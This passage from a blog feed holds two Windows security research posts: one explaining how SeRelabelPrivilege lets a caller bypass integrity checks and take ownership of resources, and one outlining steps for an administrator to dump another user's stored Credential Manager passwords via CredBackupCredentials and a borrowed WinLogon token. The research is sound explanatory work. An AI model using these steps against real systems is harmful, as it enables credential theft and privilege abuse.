integrity level above <i>System</i>, called <i>Installer</i>. Presumably&nbsp;<i>Installer</i>&nbsp;was the initial idea to block administrators modifying system files, which was replaced by the&nbsp;<i>TrustedInstaller&nbsp;</i>SID as the owner (see previous blog posts). There is a level above <i>System</i> in Vista, called <i>Protected Process</i>, which is not usable as protected processes was implementing using a different mechanism.&nbsp;</p><p>Distilling what the documentation says the privilege does, it allows for two operations. First it allows you to set the integrity level in a mandatory label ACE to be above the caller's token integrity level. Normally as long as you've been granted <i>WRITE_OWNER</i> access to a resource you can set the label's integrity level to any value less than or equal to the caller's integrity level.</p><p>For example, if you try to set the resource's label to <i>System</i>, but the caller is only at <i>High </i>then the operation fails with the&nbsp;<i>STATUS_INVALID_LABEL</i> error. If you enable <i>SeRelabelPrivilege </i>then you can set this operation will succeed.&nbsp;</p><p><i>Note, the privilege doesn't allow you to raise the integrity level of a token, you need SeTcbPrivilege for that. You can't even raise the integrity level to be less than or equal to the caller's integrity level, the operation can only decrease the level in the token without SeTcbPrivilege.</i></p><p>The second operation is that you can decrease the label. In general you can always decrease the label without the privilege, unless the resource's label is above the callers. For example you can set the label to&nbsp;<i>Low</i> without any special privilege, as long as you have <i>WRITE_OWNER</i> access on the handle and the current label is less than or equal to the caller's. However, if the label is <i>System </i>and the caller is <i>High </i>then they can't decrease the label and the privilege is required.</p><p>The documentation has this to say (emphasis mine):</p><p><i>\"If malicious software is set with an elevated integrity level such as Trusted Installer or System, administrator accounts do not have sufficient integrity levels to delete the program from the system. In that case, use of the Modify an object label right is mandated so that the object can be relabeled. However, <b>the relabeling must occur by using a process that is at the same or a higher level of integrity than the object that you are attempting to relabel</b>.\"</i></p><p>This is a very confused paragraph. First it indicates that an administrator can't delete resource with <i>Trusted Installer</i> or <i>System</i> integrity labels and so requires the privilege to relabel. And then it says that the process doing the relabeling must be at a greater or equal integrity level to do the relabeling. Which if that is the case you don't need the privilege. Perhaps the original design on mandatory labels was more sticky, as in maybe you always needed <i>SeRelabelPrivilege </i>to reduce the label regardless of its current value?</p><p>At any rate the only user that gets <i>SeRelabelPrivilege</i> by default is SYSTEM, which defaults to the <i>System </i>integrity level which is already the maximum allowed level so this behavior of the privilege seems pretty much moot. At any rate as it's a \"God\" privilege it will be disabled if the token has an integrity level less than <i>High</i>, so this lowering operation is going to be rarely useful.</p><p>This leads in to the most misunderstood part which if you squint you might be able to grasp from the privilege's documentation. The ability to lower the label of a resource is mostly dependent on whether the caller can get <i>WRITE_OWNER</i> access to the resource. However, the <i>WRITE_OWNER</i> access right is typically part of <i>GENERIC_ALL</i> in the generic mapping,&nbsp;which means it will never be granted to a caller with a lower integrity level regardless of the DACL or whether they're the owner.&nbsp;</p><p>This is the interesting thing the privilege brings to the lowering operation, it allows the caller to circumvent the MIC check for <i>WRITE_OWNER</i>. This then allows the caller to open for <i>WRITE_OWNER</i> a higher labeled resource and then change the label to any level it likes. This works the same way as <i>SeTakeOwnershipPrivilege</i>, in that it grants <i>WRITE_OWNER</i> without ever checking the DACL. However, if you use&nbsp;<i>SeTakeOwnershipPrivilege </i>it'll still be subject to the MIC check and will not grant access if the label is above the caller's integrity level.</p><p>The problem with this privilege is down to the design of MIC, specifically that <i>WRITE_OWNER</i> is overloaded to allow setting the resource's mandatory label but also its traditional use of setting the owner. There's no way for the kernel to distinguish between the two operations once the access has been granted (or at least it doesn't try to distinguish).&nbsp;</p><p>Surely, there is some limitation on what type of resource can be granted <i>WRITE_OWNER</i> access? Nope, it seems that even if the caller does not have any access rights to the resource it will still be granted&nbsp;<i>WRITE_OWNER</i>&nbsp;access. This makes the <i>SeRelabelPrivilege </i>exactly like&nbsp;<i>SeTakeOwnershipPrivilege</i> but with the adding feature of circumventing the MIC check. Summarizing, a token with <i>SeRelabelPrivilege</i> enabled&nbsp;can take ownership of any resource it likes, even one which has a higher label than the caller.</p><p>You can of course verify this yourself, here's some PowerShell script using <i>NtObjectManager</i> which you should run as an administrator. The script creates a security descriptor which doesn't grant SYSTEM any access, then tries to request <i>WRITE_OWNER</i> without and with <i>SeRelabelPrivilege</i>.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; $sd = New-NtSecurityDescriptor \"O:ANG:AND:(A;;GA;;;AN)\" -Type Directory<br />PS&gt;&nbsp;Invoke-NtToken -System {</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp;Get-NtGrantedAccess -SecurityDescriptor $sd -Access WriteOwner -PassResult</span></div><div><span style=\"font-family: courier;\">}</span></div><div><div><span style=\"font-family: courier;\">Status&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Granted Access Privileges</span></div><div><span style=\"font-family: courier;\">------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;-------------- ----------</span></div><div><span style=\"font-family: courier;\">STATUS_ACCESS_DENIED 0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NONE</span></div></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">PS&gt; Invoke-NtToken -System {</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp;Enable-NtTokenPrivilege SeRelabelPrivilege</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp;Get-NtGrantedAccess -SecurityDescriptor $sd -Access WriteOwner -PassResult</span></div><div><span style=\"font-family: courier;\">}</span></div><div><span style=\"font-family: courier;\">Status&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Granted Access Privileges</span></div><div><span style=\"font-family: courier;\">------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;-------------- ----------</span></div><div><span style=\"font-family: courier;\">STATUS_SUCCESS WriteOwner&nbsp; &nbsp; &nbsp;SeRelabelPrivilege</span></div><p>The fact that this behavior is never made explicit is probably why my friend didn't realize its behavior before. This coupled with the privilege's rare usage, only being granted by default to SYSTEM means it's not really a problem in any meaningful sense. It would be interesting to know the design choices which led to the privilege being created, it seems like its role was significantly more important at some point and became almost vestigial during the Vista development process.&nbsp;</p><p>If you've read this far is there any actual useful scenario for this privilege? The only resources which typically have elevated labels are processes and threads. You can already circumvent the MIC check using <i>SeDebugPrivilege</i>. Of course usage of that privilege is probably watched like a hawk, so you could abuse this privilege to get full access to an elevated process, by accessing changing the owner to the caller and lowering the label. Once you're the owner with a low label you can then modify the DACL to grant full access directly without <i>SeDebugPrivilege</i>.</p><p>However, as only SYSTEM gets the privilege by default you'd need to impersonate the token, which would probably just allow you to access the process anyway. So mostly it's mostly a useless quirk unless the system you're looking at has granted it to the service accounts which might then open the door slightly to escaping to SYSTEM.</p>"}], "summary": "<p>Based on my <a href=\"https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html\">previous blog post</a> I recently had a conversation with a friend and well-known Windows security researcher about token privileges. Specifically, I was musing on how <i>SeTrustedCredmanAccessPrivilege</i> is not a \"God\" privilege. After some back and forth it seemed we were talking at cross purposes. My concept of a \"God\" privilege is one which the kernel considers to make a token elevated (see&nbsp;<a href=\"https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-3.html\">Reading Your Way Around UAC (Part 3)</a>) and so doesn't make it available to any token with an integrity level less than <i>High</i>. They on the other hand consider such a privilege to be one where you can directly compromise a resource or the OS as a whole by having the privilege enabled, this might include privileges which aren't strictly a \"God\" from the kernel's perspective but can still allow system compromise.</p><p>After realizing the misunderstanding I was still surprised that one of the privileges in their list wasn't considering a \"God\", specifically&nbsp;<i>SeRelabelPrivilege</i>. It seems that there's perhaps some confusion as to what this privilege actually allows you to do, so I thought it'd be worth clearing it up.</p><p><i>Point of pedantry: I don't believe it's correct to say that a resource has an integrity level. It instead has a mandatory label, which is stored in an ACE in the SACL. That ACE contains a SID which maps to an integrity level and an mandatory policy which is stored in the access mask. The combination of integrity level and policy is what determines what access is granted (although you can't grant write up through the policy). The token on the other hand does have an integrity level and a separate mandatory policy, which isn't the same as the one in the ACE. Oddly you specify the value when calling <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-settokeninformation\">SetTokenInformation</a> using a <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_label\">TOKEN_MANDATORY_LABEL</a> structure, confusing I know.</i></p><p>As with a lot of privileges which don't get used very often the official documentation is not great. You can find the MSDN documentation&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/modify-an-object-label\">here</a>. The page is worse than usual as it seems to have been written at a time in the Vista/Longhorn development when the <a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control\">Mandatory Integrity Control (MIC)</a> (or as it calls it <i>Windows Integrity Control (WIC)</i>) feature was still in flux. For example, it mentions an integrity level above <i>System</i>, called <i>Installer</i>. Presumably&nbsp;<i>Installer</i>&nbsp;was the initial idea to block administrators modifying system files, which was replaced by the&nbsp;<i>TrustedInstaller&nbsp;</i>SID as the owner (see previous blog posts). There is a level above <i>System</i> in Vista, called <i>Protected Process</i>, which is not usable as protected processes was implementing using a different mechanism.&nbsp;</p><p>Distilling what the documentation says the privilege does, it allows for two operations. First it allows you to set the integrity level in a mandatory label ACE to be above the caller's token integrity level. Normally as long as you've been granted <i>WRITE_OWNER</i> access to a resource you can set the label's integrity level to any value less than or equal to the caller's integrity level.</p><p>For example, if you try to set the resource's label to <i>System</i>, but the caller is only at <i>High </i>then the operation fails with the&nbsp;<i>STATUS_INVALID_LABEL</i> error. If you enable <i>SeRelabelPrivilege </i>then you can set this operation will succeed.&nbsp;</p><p><i>Note, the privilege doesn't allow you to raise the integrity level of a token, you need SeTcbPrivilege for that. You can't even raise the integrity level to be less than or equal to the caller's integrity level, the operation can only decrease the level in the token without SeTcbPrivilege.</i></p><p>The second operation is that you can decrease the label. In general you can always decrease the label without the privilege, unless the resource's label is above the callers. For example you can set the label to&nbsp;<i>Low</i> without any special privilege, as long as you have <i>WRITE_OWNER</i> access on the handle and the current label is less than or equal to the caller's. However, if the label is <i>System </i>and the caller is <i>High </i>then they can't decrease the label and the privilege is required.</p><p>The documentation has this to say (emphasis mine):</p><p><i>\"If malicious software is set with an elevated integrity level such as Trusted Installer or System, administrator accounts do not have sufficient integrity levels to delete the program from the system. In that case, use of the Modify an object label right is mandated so that the object can be relabeled. However, <b>the relabeling must occur by using a process that is at the same or a higher level of integrity than the object that you are attempting to relabel</b>.\"</i></p><p>This is a very confused paragraph. First it indicates that an administrator can't delete resource with <i>Trusted Installer</i> or <i>System</i> integrity labels and so requires the privilege to relabel. And then it says that the process doing the relabeling must be at a greater or equal integrity level to do the relabeling. Which if that is the case you don't need the privilege. Perhaps the original design on mandatory labels was more sticky, as in maybe you always needed <i>SeRelabelPrivilege </i>to reduce the label regardless of its current value?</p><p>At any rate the only user that gets <i>SeRelabelPrivilege</i> by default is SYSTEM, which defaults to the <i>System </i>integrity level which is already the maximum allowed level so this behavior of the privilege seems pretty much moot. At any rate as it's a \"God\" privilege it will be disabled if the token has an integrity level less than <i>High</i>, so this lowering operation is going to be rarely useful.</p><p>This leads in to the most misunderstood part which if you squint you might be able to grasp from the privilege's documentation. The ability to lower the label of a resource is mostly dependent on whether the caller can get <i>WRITE_OWNER</i> access to the resource. However, the <i>WRITE_OWNER</i> access right is typically part of <i>GENERIC_ALL</i> in the generic mapping,&nbsp;which means it will never be granted to a caller with a lower integrity level regardless of the DACL or whether they're the owner.&nbsp;</p><p>This is the interesting thing the privilege brings to the lowering operation, it allows the caller to circumvent the MIC check for <i>WRITE_OWNER</i>. This then allows the caller to open for <i>WRITE_OWNER</i> a higher labeled resource and then change the label to any level it likes. This works the same way as <i>SeTakeOwnershipPrivilege</i>, in that it grants <i>WRITE_OWNER</i> without ever checking the DACL. However, if you use&nbsp;<i>SeTakeOwnershipPrivilege </i>it'll still be subject to the MIC check and will not grant access if the label is above the caller's integrity level.</p><p>The problem with this privilege is down to the design of MIC, specifically that <i>WRITE_OWNER</i> is overloaded to allow setting the resource's mandatory label but also its traditional use of setting the owner. There's no way for the kernel to distinguish between the two operations once the access has been granted (or at least it doesn't try to distinguish).&nbsp;</p><p>Surely, there is some limitation on what type of resource can be granted <i>WRITE_OWNER</i> access? Nope, it seems that even if the caller does not have any access rights to the resource it will still be granted&nbsp;<i>WRITE_OWNER</i>&nbsp;access. This makes the <i>SeRelabelPrivilege </i>exactly like&nbsp;<i>SeTakeOwnershipPrivilege</i> but with the adding feature of circumventing the MIC check. Summarizing, a token with <i>SeRelabelPrivilege</i> enabled&nbsp;can take ownership of any resource it likes, even one which has a higher label than the caller.</p><p>You can of course verify this yourself, here's some PowerShell script using <i>NtObjectManager</i> which you should run as an administrator. The script creates a security descriptor which doesn't grant SYSTEM any access, then tries to request <i>WRITE_OWNER</i> without and with <i>SeRelabelPrivilege</i>.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">PS&gt; $sd = New-NtSecurityDescriptor \"O:ANG:AND:(A;;GA;;;AN)\" -Type Directory<br />PS&gt;&nbsp;Invoke-NtToken -System {</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp;Get-NtGrantedAccess -SecurityDescriptor $sd -Access WriteOwner -PassResult</span></div><div><span style=\"font-family: courier;\">}</span></div><div><div><span style=\"font-family: courier;\">Status&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Granted Access Privileges</span></div><div><span style=\"font-family: courier;\">------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;-------------- ----------</span></div><div><span style=\"font-family: courier;\">STATUS_ACCESS_DENIED 0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NONE</span></div></div><div><span style=\"font-family: courier;\"><br /></span></div><div><span style=\"font-family: courier;\">PS&gt; Invoke-NtToken -System {</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp;Enable-NtTokenPrivilege SeRelabelPrivilege</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp;Get-NtGrantedAccess -SecurityDescriptor $sd -Access WriteOwner -PassResult</span></div><div><span style=\"font-family: courier;\">}</span></div><div><span style=\"font-family: courier;\">Status&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Granted Access Privileges</span></div><div><span style=\"font-family: courier;\">------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;-------------- ----------</span></div><div><span style=\"font-family: courier;\">STATUS_SUCCESS WriteOwner&nbsp; &nbsp; &nbsp;SeRelabelPrivilege</span></div><p>The fact that this behavior is never made explicit is probably why my friend didn't realize its behavior before. This coupled with the privilege's rare usage, only being granted by default to SYSTEM means it's not really a problem in any meaningful sense. It would be interesting to know the design choices which led to the privilege being created, it seems like its role was significantly more important at some point and became almost vestigial during the Vista development process.&nbsp;</p><p>If you've read this far is there any actual useful scenario for this privilege? The only resources which typically have elevated labels are processes and threads. You can already circumvent the MIC check using <i>SeDebugPrivilege</i>. Of course usage of that privilege is probably watched like a hawk, so you could abuse this privilege to get full access to an elevated process, by accessing changing the owner to the caller and lowering the label. Once you're the owner with a low label you can then modify the DACL to grant full access directly without <i>SeDebugPrivilege</i>.</p><p>However, as only SYSTEM gets the privilege by default you'd need to impersonate the token, which would probably just allow you to access the process anyway. So mostly it's mostly a useless quirk unless the system you're looking at has granted it to the service accounts which might then open the door slightly to escaping to SYSTEM.</p>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/2152994535793869192"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/2152994535793869192"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2021/06/the-much-misunderstood.html", "title": "The Much Misunderstood SeRelabelPrivilege"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-5533357868614285443", "guidislink": true, "link": "https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html", "published": "2021-05-21T00:03:00.002-07:00", "published_parsed": [2021, 5, 21, 7, 3, 0, 4, 141, 0], "updated": "2021-05-21T18:47:17.079-07:00", "updated_parsed": [2021, 5, 22, 1, 47, 17, 5, 142, 0], "title": "Dumping Stored Credentials with SeTrustedCredmanAccessPrivilege", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Dumping Stored Credentials with SeTrustedCredmanAccessPrivilege"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>I've been going through the various token privileges on Windows trying to find where they're used. One which looked interesting is&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-credential-manager-as-a-trusted-caller\">SeTrustedCredmanAccessPrivilege</a> which is documented as <i>\"Access Credential Manager as a trusted caller\"</i>. The <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/\">Credential Manager</a> allows a user to store credentials, such as web or domain accounts in a central location that only they can access. It's protected using DPAPI so in theory it's only accessible when the user has authenticated to the system. The question is, what does having <i>SeTrustedCredmanAccessPrivilege</i> grant? I couldn't immediately find anyone who'd bothered to document it, so I guess I'll have to do it myself.</p><p>The Credential Manager is one of those features that probably sounded great in the design stage, but does introduce security risks, especially if it's used to store privileged domain credentials, such as for remote desktop access. An application, such as the remote desktop client, can store domain credential using the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credwritew\">CredWrite</a> API and specifying the username and password in the CREDENTIAL structure. The type of credentials should be set to&nbsp;<i>CRED_TYPE_DOMAIN_PASSWORD.</i></p><p>An application can then access the stored credentials for the current user using APIs such as <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credreadw\">CredRead</a>&nbsp;or <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratew\">CredEnumerate</a>. However, if the type of credential is&nbsp;<i>CRED_TYPE_DOMAIN_PASSWORD</i>&nbsp;the&nbsp;<i>CredentialBlob</i> field which should contain the password is always empty. This is an artificial restriction put in place by LSASS which implements the credential manager RPC service. If a domain credentials type is being read then it will never return the password.</p><p>How does the domain credentials get used if you can't read the password? Security packages such as NTLM/Kerberos/TSSSP which are running within the LSASS process can use an internal API which doesn't restrict the reading of the domain password. Therefore, when you authenticate to the remote desktop service the target name is used to lookup available credentials, if they exist the user will be automatically authenticated.</p><p>The credentials are stored in files in the user's profile encrypted with the user's DPAPI key. Why can we not just decrypt the file directly to get the password? When writing the file LSASS sets a system flag in the encrypted blob which makes the DPAPI refuse to decrypt the blob even though it's still under a user's key. Only code running in LSASS can call the DPAPI to decrypt the blob.</p><p>If we have administrator privileges getting access the password is trivial. Read the <a href=\"https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials\">Mimikatz wiki page</a> to understand the various ways that you can use the tool to get access to the credentials. However, it boils down to one of the following approaches:</p><p></p><ol style=\"text-align: left;\"><li>Patch out the checks in LSASS to not blank the password when read from a normal user.</li><li>Inject code into LSASS to decrypt the file or read the credentials.</li><li>Just read them from LSASS's memory.</li><li>Reimplement DPAPI with knowledge of the user's password to ignore the system flag.</li><li>Play games with the domain key backup protocol.</li></ol><div>For example, Nirsoft's <a href=\"https://www.nirsoft.net/utils/credentials_file_view.html\">CredentialsFileView</a> seems to use the injection into LSASS technique to decrypt the DPAPI protected credential files. (<strike>Caveat, I've only looked at v1.07 as v1.10 seems to not be available for download anymore, so maybe it's now different.</strike> UPDATE: it seems available for download again but Defender thinks it's malware, plus \u00e7a change).</div><div><br /></div><div>At this point you can probably guess that&nbsp;<i>SeTrustedCredmanAccessPrivilege</i> allows a caller to get access to a user's credentials. But how exactly? Looking at <i>LSASRV.DLL</i> which contains the implementation of the Credential Manager the privilege is checked in the function <i>CredpIsRpcClientTrusted</i>. This is only called by two APIs,&nbsp;<i>CredrReadByTokenHandle </i>and&nbsp;<i>CredrBackupCredentials </i>which are exported through the <i>CredReadByTokenHandle </i>and <i>CredBackupCredentials </i>APIs.</div><div><br /></div><div>The&nbsp;<i>CredReadByTokenHandle</i> API isn't that interesting, it's basically <i>CredRead</i> but allows the user to read from to be specified by providing the user's token. As far as I can tell reading a domain credential still returns a blank password.&nbsp;<i>CredBackupCredentials</i> on the other hand is interesting. It's the API used by <i>CREDWIZ.EXE</i> to backup a user's credentials, which can then be restored at a later time. This backup includes all credentials including domain credentials. The prototype for the API is as follows:</div><div><br /></div><div><span style=\"font-family: courier;\">BOOL WINAPI CredBackupCredentials(HANDLE Token,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LPCWSTR Path,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PVOID Password,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD PasswordSize,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD Flags);</span></div><div><br /></div><div>The backup process is slightly convoluted, first you run <i>CREDWIZ </i>on your desktop and select backup and specify the file you want to write the backup to. When you continue with the backup the process makes an RPC call to your <i>WinLogon </i>process with the credentials path which spawns a new copy of <i>CREDWIZ </i>on the secure desktop. At this point you're instructed to use CTRL+ALT+DEL to switch to the secure desktop. Here you type the password, which is used to encrypt the file to protect it at rest, and is needed when the credentials are restored. <i>CREDWIZ </i>will even ensure it meets your system's password policy for complexity, how generous.</div><div><br /></div><div><i>CREDWIZ </i>first stores the file to a temporary file, as LSASS encrypts the encrypted contents with the system DPAPI key. The file can be decrypted then written to the final destination, with appropriate impersonation etc.</div><div><br /></div><div>The only requirement for calling this API is having the&nbsp;<i>SeTrustedCredmanAccessPrivilege </i>privilege enabled. Assuming we're an administrator getting this privilege is easy as we can just borrow a token from another process. For example, checking for what processes have the privilege shows obviously <i>WinLogon</i> but also LSASS itself even though it arguably doesn't need it.</div><div><br /></div><div><span style=\"font-family: courier;\">PS&gt; $ts = Get-AccessibleToken</span></div><div><span style=\"font-family: courier;\">PS&gt; $ts | ? {&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp;\"SeTrustedCredmanAccessPrivilege\" -in $_.ProcessTokenInfo.Privileges.Name&nbsp;</span></div><div><span style=\"font-family: courier;\">}</span></div><div><div><span style=\"font-family: courier;\">TokenId Access&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name</span></div><div><span style=\"font-family: courier;\">------- ------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----</span></div><div><span style=\"font-family: courier;\">1A41253 GenericExecute|GenericRead&nbsp; &nbsp; LsaIso.exe:124</span></div><div><span style=\"font-family: courier;\">1A41253 GenericExecute|GenericRead&nbsp; &nbsp; &nbsp;lsass.exe:672</span></div><div><span style=\"font-family: courier;\">1A41253 GenericExecute|GenericRead winlogon.exe:1052</span></div><div><span style=\"font-family: courier;\">1A41253 GenericExecute|GenericRead atieclxx.exe:4364</span></div></div><div><br /></div><div>I've literally no idea what the <i>ATIECLXX.EXE</i>&nbsp;process is doing with&nbsp;<i>SeTrustedCredmanAccessPrivilege</i>, it's probably best not to ask ;-)</div><div><br /></div><div>To use this API to backup a user's credentials as an administrator you do the following.&nbsp;</div><div><ol style=\"text-align: left;\"><li>Open a <i>WinLogon </i>process for <i>PROCESS_QUERY_LIMITED_INFORMATION</i> access and get a handle to its token with <i>TOKEN_DUPLICATE</i> access.</li><li>Duplicate token into an impersonation token, then enable&nbsp;<i>SeTrustedCredmanAccessPrivilege.</i></li><li>Open a token to the target user, who must already be authenticated.</li><li>Call&nbsp;<i>CredBackupCredentials</i> while impersonating the <i>WinLogon</i> token passing a path to write to and a NULL password to disable the user encryption (just to make life easier). It's <i>CREDWIZ </i>which enforces the password policy not the API.</li><li>While still impersonating open the file and decrypt it using the&nbsp;<i>CryptUnprotectData </i>API, write back out the decrypted data.</li></ol><div>If it all goes well you'll have all the of the user's credentials in a packed binary format. I couldn't immediately find anyone documenting it, but people obviously have done before. I'll leave doing all this yourself as a exercise for the reader. I don't feel like providing an implementation.</div></div><div><br /></div><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-AsVtziWSfY0/YKdV0_dbRMI/AAAAAAAAFo8/wTTnz-R63BolT_U51hhJ8i3URW3pe5_lACLcBGAsYHQ/s1069/backup_creds.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"228\" src=\"https://1.bp.blogspot.com/-AsVtziWSfY0/YKdV0_dbRMI/AAAAAAAAFo8/wTTnz-R63BolT_U51hhJ8i3URW3pe5_lACLcBGAsYHQ/w400-h228/backup_creds.PNG\" width=\"400\" /></a></div><div><br /></div>Why would you do this when there already exists plenty of other options? The main advantage, if you can call it that, it you never touch LSASS and definitely never inject any code into it. This wouldn't be possible anyway if LSASS is running as PPL. You also don't need to access the SECURITY hive to extract DPAPI credentials or know the user's password (assuming they're authenticated of course). About the only slightly suspicious thing is opening <i>WinLogon</i>&nbsp;to get a token, though there might be alternative approaches to get a suitable token.<br /><div><br /></div><div><br /></div><div><br /></div><p></p>"}], "summary": "<p>I've been going through the various token privileges on Windows trying to find where they're used. One which looked interesting is&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-credential-manager-as-a-trusted-caller\">SeTrustedCredmanAccessPrivilege</a> which is documented as <i>\"Access Credential Manager as a trusted caller\"</i>. The <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/\">Credential Manager</a> allows a user to store credentials, such as web or domain accounts in a central location that only they can access. It's protected using DPAPI so in theory it's only accessible when the user has authenticated to the system. The question is, what does having <i>SeTrustedCredmanAccessPrivilege</i> grant? I couldn't immediately find anyone who'd bothered to document it, so I guess I'll have to do it myself.</p><p>The Credential Manager is one of those features that probably sounded great in the design stage, but does introduce security risks, especially if it's used to store privileged domain credentials, such as for remote desktop access. An application, such as the remote desktop client, can store domain credential using the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credwritew\">CredWrite</a> API and specifying the username and password in the CREDENTIAL structure. The type of credentials should be set to&nbsp;<i>CRED_TYPE_DOMAIN_PASSWORD.</i></p><p>An application can then access the stored credentials for the current user using APIs such as <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credreadw\">CredRead</a>&nbsp;or <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratew\">CredEnumerate</a>. However, if the type of credential is&nbsp;<i>CRED_TYPE_DOMAIN_PASSWORD</i>&nbsp;the&nbsp;<i>CredentialBlob</i> field which should contain the password is always empty. This is an artificial restriction put in place by LSASS which implements the credential manager RPC service. If a domain credentials type is being read then it will never return the password.</p><p>How does the domain credentials get used if you can't read the password? Security packages such as NTLM/Kerberos/TSSSP which are running within the LSASS process can use an internal API which doesn't restrict the reading of the domain password. Therefore, when you authenticate to the remote desktop service the target name is used to lookup available credentials, if they exist the user will be automatically authenticated.</p><p>The credentials are stored in files in the user's profile encrypted with the user's DPAPI key. Why can we not just decrypt the file directly to get the password? When writing the file LSASS sets a system flag in the encrypted blob which makes the DPAPI refuse to decrypt the blob even though it's still under a user's key. Only code running in LSASS can call the DPAPI to decrypt the blob.</p><p>If we have administrator privileges getting access the password is trivial. Read the <a href=\"https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials\">Mimikatz wiki page</a> to understand the various ways that you can use the tool to get access to the credentials. However, it boils down to one of the following approaches:</p><p></p><ol style=\"text-align: left;\"><li>Patch out the checks in LSASS to not blank the password when read from a normal user.</li><li>Inject code into LSASS to decrypt the file or read the credentials.</li><li>Just read them from LSASS's memory.</li><li>Reimplement DPAPI with knowledge of the user's password to ignore the system flag.</li><li>Play games with the domain key backup protocol.</li></ol><div>For example, Nirsoft's <a href=\"https://www.nirsoft.net/utils/credentials_file_view.html\">CredentialsFileView</a> seems to use the injection into LSASS technique to decrypt the DPAPI protected credential files. (<strike>Caveat, I've only looked at v1.07 as v1.10 seems to not be available for download anymore, so maybe it's now different.</strike> UPDATE: it seems available for download again but Defender thinks it's malware, plus \u00e7a change).</div><div><br /></div><div>At this point you can probably guess that&nbsp;<i>SeTrustedCredmanAccessPrivilege</i> allows a caller to get access to a user's credentials. But how exactly? Looking at <i>LSASRV.DLL</i> which contains the implementation of the Credential Manager the privilege is checked in the function 